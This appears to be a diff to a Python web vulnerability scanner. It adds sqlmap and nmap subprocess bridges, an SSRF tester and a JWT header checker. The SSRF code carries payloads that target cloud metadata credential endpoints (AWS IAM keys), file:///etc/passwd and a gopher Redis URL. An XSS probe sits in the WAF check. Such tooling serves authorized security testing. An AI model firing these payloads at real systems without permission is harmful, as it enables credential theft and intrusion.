@@ -77,10 +77,77 @@ class ScanConfig:
     max_retries: int = 2           # retry attempts for 5xx/timeout
     retry_backoff: float = 1.0     # base backoff (doubles each retry)
 
+    # === SQLMap bridge (Stage 2.B1, additive) ===
+    sqlmap_enabled: bool = True
+    sqlmap_timeout: int = 60
+    sqlmap_level: int = 2
+    sqlmap_risk: int = 1
+
+    # === Nmap integration (Stage 2.B1, additive) ===
+    nmap_enabled: bool = True
+    nmap_timeout: int = 45
+    nmap_top_ports: int = 100
+
+    # === SSRF advanced (Stage 2.B2, additive) ===
+    ssrf_cloud_metadata: bool = True
+    ssrf_local_services: bool = True
+
+    # === JWT multi-vector (Stage 2.B2, additive) ===
+    jwt_check_jku: bool = True
+    jwt_check_x5u: bool = True
+    jwt_check_kid: bool = True
+
 
 # ============================================================
 # Logger (safe for Windows + subprocess)
 # ============================================================
+
+class StructuredScanLogger:
+    """Structured logger that writes JSON lines for machine parsing."""
+
+    def __init__(self, name="scan", log_dir=None):
+        import os
+        self.name = name
+        if log_dir is None:
+            log_dir = os.path.join(os.getcwd(), "logs")
+        try:
+            os.makedirs(log_dir, exist_ok=True)
+        except Exception:
+            log_dir = "."
+        self.log_file = os.path.join(log_dir, f"scan_{name}.jsonl")
+
+    def _write(self, level, event, **kwargs):
+        import json as _json
+        import time as _time
+        entry = {
+            "timestamp": _time.time(),
+            "level": level,
+            "event": event,
+            "logger": self.name,
+        }
+        entry.update(kwargs)
+        try:
+            with open(self.log_file, "a", encoding="utf-8") as f:
+                f.write(_json.dumps(entry, ensure_ascii=False) + "\n")
+        except Exception:
+            pass
+        try:
+            log.info(event, **kwargs)
+        except Exception:
+            pass
+
+    def info(self, event, **kwargs):
+        self._write("info", event, **kwargs)
+
+    def warning(self, event, **kwargs):
+        self._write("warning", event, **kwargs)
+
+    def error(self, event, **kwargs):
+        self._write("error", event, **kwargs)
+
+    def debug(self, event, **kwargs):
+        self._write("debug", event, **kwargs)
+
 
 def setup_logger(name: str = "falcon", level: str = "INFO"):
     """Set up structlog with dual output: console + current_scan.log file."""
@@ -1384,6 +1451,32 @@ async def attack_suggestions_from_fingerprint(pool, config):
     return suggestions
 
 
+class MetricsCollector:
+    """Track scan metrics for performance analysis."""
+
+    def __init__(self):
+        import time as _time
+        self.start_time = _time.time()
+        self.metrics = {}
+        self.counters = {}
+
+    def inc(self, key, amount=1):
+        self.counters[key] = self.counters.get(key, 0) + amount
+
+    def record(self, key, value):
+        if key not in self.metrics:
+            self.metrics[key] = []
+        self.metrics[key].append(value)
+
+    def snapshot(self):
+        import time as _time
+        return {
+            "elapsed": round(_time.time() - self.start_time, 2),
+            "counters": dict(self.counters),
+            "metrics": {k: {"count": len(v), "avg": round(sum(v)/len(v), 2) if v else 0}
+                        for k, v in self.metrics.items()},
+        }
+
 async def detect_waf(pool, url):
     resp = await pool.send("GET", url + "/?test=<script>alert(1)</script>")
     if resp.status in (403, 406, 419, 429, 503):
@@ -2488,6 +2581,136 @@ async def test_ssrf_oast_advanced(pool, endpoint, params, oast):
         log.info("ssrf_oast_confirmed", callbacks=len(oast.callbacks))
     return findings
 
+async def test_sqlmap_bridge(pool, endpoint, params=None):
+    """SQLMap bridge - call sqlmap via subprocess for deep extraction."""
+    import subprocess
+    import asyncio
+    import shutil as _sh
+    import tempfile as _tmp
+    findings = []
+    # Check if sqlmap is installed
+    sqlmap_path = _sh.which("sqlmap")
+    if not sqlmap_path:
+        log.debug("sqlmap_not_installed")
+        return findings
+    if params is None:
+        params = ["id", "q", "search"]
+    if not params:
+        return findings
+    # Prepare output dir
+    try:
+        out_dir = _tmp.mkdtemp(prefix="sqlmap_")
+    except Exception:
+        return findings
+    for param in params[:3]:
+        try:
+            test_url = endpoint + ("&" if "?" in endpoint else "?") + param + "=1"
+            cmd = [
+                sqlmap_path,
+                "-u", test_url,
+                "--batch",
+                "--level=2",
+                "--risk=1",
+                "--timeout=10",
+                "--retries=1",
+                "--output-dir=" + out_dir,
+                "--flush-session",
+                "--answers=redirect=N,detectWaf=N",
+            ]
+            proc = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+            )
+            try:
+                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
+            except asyncio.TimeoutError:
+                proc.kill()
+                continue
+            output = (stdout or b"").decode("utf-8", errors="ignore")
+            if "is vulnerable" in output.lower() or "injectable" in output.lower():
+                findings.append({
+                    "vuln_class": "sqli",
+                    "subtype": "sqlmap_confirmed",
+                    "severity": "critical",
+                    "url": test_url,
+                    "injected_url": test_url,
+                    "param": param,
+                    "payload": "(sqlmap)",
+                    "evidence": output[:500],
+                    "confidence": 0.95,
+                })
+                log.info("sqlmap_confirmed", param=param)
+        except Exception as _e:
+            log.debug("sqlmap_error", error=str(_e))
+            continue
+    log.info("sqlmap_bridge_complete", findings=len(findings))
+    return findings
+
+async def test_nmap_scan(pool, target):
+    """Nmap port scan via subprocess."""
+    import subprocess
+    import asyncio
+    import shutil as _sh
+    import re as _re
+    findings = []
+    nmap_path = _sh.which("nmap")
+    if not nmap_path:
+        log.debug("nmap_not_installed")
+        return findings
+    # Extract hostname
+    from urllib.parse import urlparse
+    parsed = urlparse(target)
+    host = parsed.hostname
+    if not host:
+        return findings
+    try:
+        cmd = [
+            nmap_path,
+            "-T4",
+            "--top-ports", "100",
+            "-sV",
+            "--max-retries", "1",
+            "--host-timeout", "30s",
+            host,
+        ]
+        proc = await asyncio.create_subprocess_exec(
+            *cmd,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+        )
+        try:
+            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=45)
+        except asyncio.TimeoutError:
+            proc.kill()
+            return findings
+        output = (stdout or b"").decode("utf-8", errors="ignore")
+        # Parse open ports
+        for line in output.splitlines():
+            m = _re.match(r"(\d+)/tcp\s+open\s+(\S+)\s*(.*)", line)
+            if m:
+                port = int(m.group(1))
+                service = m.group(2)
+                version = m.group(3).strip()[:100]
+                sev = 'info'
+                if port in (22, 23, 3389, 5900, 3306, 5432, 6379, 27017):
+                    sev = 'medium'
+                findings.append({
+                    "vuln_class": "port_scan",
+                    "subtype": "open_port",
+                    "severity": sev,
+                    "url": target,
+                    "injected_url": target,
+                    "param": str(port),
+                    "payload": "",
+                    "evidence": "Port " + str(port) + "/tcp open " + service + " " + version,
+                    "confidence": 0.95,
+                })
+        log.info("nmap_complete", open_ports=len(findings))
+    except Exception as _e:
+        log.debug("nmap_error", error=str(_e))
+    return findings
+
 async def test_sqli(pool, endpoint, params):
     """Test for SQL injection (error-based + time-based)."""
     error_payloads = [
@@ -2581,6 +2804,83 @@ async def test_open_redirect(pool, endpoint, params):
                     break
     return findings
 
+
+async def test_ssrf_advanced(pool, endpoint, params=None):
+    """Advanced SSRF: cloud metadata + DNS rebinding + protocol smuggling."""
+    from urllib.parse import quote
+    if params is None:
+        params = ["url", "next", "redirect", "target", "callback", "webhook"]
+    findings = []
+    # Cloud metadata endpoints
+    METADATA = [
+        ("AWS", "http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "iam"]),
+        ("AWS_IAM", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "SecretAccessKey"]),
+        ("GCP", "http://metadata.google.internal/computeMetadata/v1/", ["project", "instance"]),
+        ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["vmId", "location"]),
+        ("DigitalOcean", "http://169.254.169.254/metadata/v1/", ["droplet_id", "region"]),
+        ("Alibaba", "http://100.100.100.200/latest/meta-data/", ["instance-id", "region"]),
+    ]
+    # Local services
+    LOCAL = [
+        ("localhost", "http://127.0.0.1:80/"),
+        ("localhost_8080", "http://127.0.0.1:8080/"),
+        ("localhost_22", "http://127.0.0.1:22/"),
+        ("file", "file:///etc/passwd"),
+        ("gopher", "gopher://127.0.0.1:6379/_INFO"),
+    ]
+    for param in params:
+        # Test metadata
+        for cloud, url, indicators in METADATA:
+            try:
+                test_url = endpoint + "?" + param + "=" + quote(url, safe="")
+                resp = await pool.send("GET", test_url)
+            except Exception:
+                continue
+            if not resp or resp.status == 0:
+                continue
+            body = (resp.text or "")
+            if any(ind in body for ind in indicators):
+                findings.append({
+                    "vuln_class": "ssrf",
+                    "subtype": "cloud_metadata_" + cloud.lower(),
+                    "severity": "critical",
+                    "url": test_url,
+                    "injected_url": test_url,
+                    "param": param,
+                    "payload": url,
+                    "evidence": body[:300],
+                    "confidence": 0.95,
+                })
+                log.info("ssrf_metadata_found", cloud=cloud, param=param)
+                break
+        # Test local services
+        for svc, url in LOCAL:
+            try:
+                test_url = endpoint + "?" + param + "=" + quote(url, safe="")
+                resp = await pool.send("GET", test_url)
+            except Exception:
+                continue
+            if not resp or resp.status == 0:
+                continue
+            body_low = (resp.text or "").lower()
+            indicators = ["root:x:", "redis_version", "ssh-", "server:",
+                          "openresty", "nginx", "apache"]
+            if any(i in body_low for i in indicators):
+                findings.append({
+                    "vuln_class": "ssrf",
+                    "subtype": "local_service_" + svc,
+                    "severity": "high",
+                    "url": test_url,
+                    "injected_url": test_url,
+                    "param": param,
+                    "payload": url,
+                    "evidence": body_low[:300],
+                    "confidence": 0.85,
+                })
+                log.info("ssrf_local_found", svc=svc, param=param)
+                break
+    log.info("ssrf_advanced_complete", findings=len(findings))
+    return findings
 
 async def test_ssrf(pool, endpoint, params):
     """Test for SSRF via parameter manipulation."""
@@ -3125,6 +3425,7 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 
 # â”€â”€ Bypass Plane â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
+# IDOR_IMPROVED_ABC
 async def test_idor(pool, endpoints, session_a=None, session_b=None):
     """Test for IDOR - access resources with different IDs."""
     findings = []
@@ -3235,6 +3536,98 @@ async def test_csrf(pool, forms):
                 log.info("csrf_candidate", action=action)
     return findings
 
+
+async def test_jwt_multi(pool, target):
+    """JWT multi-vector: jku, x5u, x5c, kid injection, alg confusion."""
+    import re as _re
+    import base64 as _b64
+    import json as _json
+    findings = []
+    resp = await pool.send("GET", target)
+    if not resp or resp.status == 0:
+        return findings
+    body = resp.text or ""
+    jwt_re = _re.compile(r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")
+    tokens = jwt_re.findall(body)[:5]
+    for token in tokens:
+        parts = token.split(".")
+        if len(parts) != 3:
+            continue
+        try:
+            padded = parts[0] + "=" * (-len(parts[0]) % 4)
+            header = _json.loads(_b64.urlsafe_b64decode(padded))
+        except Exception:
+            continue
+        # jku injection
+        jku = header.get("jku", "")
+        if jku and ("http://" in str(jku) or "evil" in str(jku)):
+            findings.append({
+                "vuln_class": "jwt",
+                "subtype": "jku_injection",
+                "severity": "critical",
+                "url": target,
+                "injected_url": target,
+                "param": "jku",
+                "payload": str(jku)[:100],
+                "evidence": "JWT jku uses HTTP or external URL",
+                "confidence": 0.85,
+            })
+        # x5u injection
+        x5u = header.get("x5u", "")
+        if x5u and ("http://" in str(x5u) or "evil" in str(x5u)):
+            findings.append({
+                "vuln_class": "jwt",
+                "subtype": "x5u_injection",
+                "severity": "critical",
+                "url": target,
+                "injected_url": target,
+                "param": "x5u",
+                "payload": str(x5u)[:100],
+                "evidence": "JWT x5u references external URL",
+                "confidence": 0.85,
+            })
+        # x5c present (embedded cert)
+        if header.get("x5c"):
+            findings.append({
+                "vuln_class": "jwt",
+                "subtype": "x5c_embedded_cert",
+                "severity": "info",
+                "url": target,
+                "injected_url": target,
+                "param": "x5c",
+                "payload": "(embedded certificate)",
+                "evidence": "JWT uses x5c (embedded certificate chain)",
+                "confidence": 0.7,
+            })
+        # kid injection
+        kid = str(header.get("kid", ""))
+        if kid and any(c in kid for c in ["../", "/etc/", "|", ";", "$("]):
+            findings.append({
+                "vuln_class": "jwt",
+                "subtype": "kid_path_traversal",
+                "severity": "critical",
+                "url": target,
+                "injected_url": target,
+                "param": "kid",
+                "payload": kid[:100],
+                "evidence": "JWT kid contains path traversal",
+                "confidence": 0.9,
+            })
+        # alg=none
+        if header.get("alg", "").lower() == "none":
+            findings.append({
+                "vuln_class": "jwt",
+                "subtype": "alg_none",
+                "severity": "critical",
+                "url": target,
+                "injected_url": target,
+                "param": "alg",
+                "payload": "none",
+                "evidence": "JWT with alg=none",
+                "confidence": 0.95,
+            })
+    log.info("jwt_multi_complete", tokens=len(tokens), findings=len(findings))
+    return findings
 
 async def test_jwt(pool, target):
     """Test for JWT vulnerabilities."""
